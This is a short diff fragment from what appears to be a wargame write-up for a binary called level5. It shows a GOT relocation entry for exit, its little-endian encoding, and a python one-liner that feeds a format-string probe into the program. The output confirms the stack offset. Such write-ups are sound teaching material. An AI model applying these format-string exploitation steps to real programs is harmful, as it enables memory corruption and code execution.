@@ -15,8 +15,10 @@ OFFSET   TYPE              VALUE
 08049834 R_386_JUMP_SLOT   __gmon_start__
 <strong>08049838</strong> R_386_JUMP_SLOT   exit
 0804983c R_386_JUMP_SLOT   __libc_start_main
+</pre>
 - (hex)0x08049838 = (little indian)\\x38\\x98\\x04\\x08
 - `python -c "print('AAAA' + '\x38\x98\x04\x08' + '%x ' * 5)" | ./level5`
+<pre>
 AAAA8200 b7fd1ac0 b7ff37d0 <strong>41414141 8049838</strong>
 </pre>
 - `gdb ./level5`
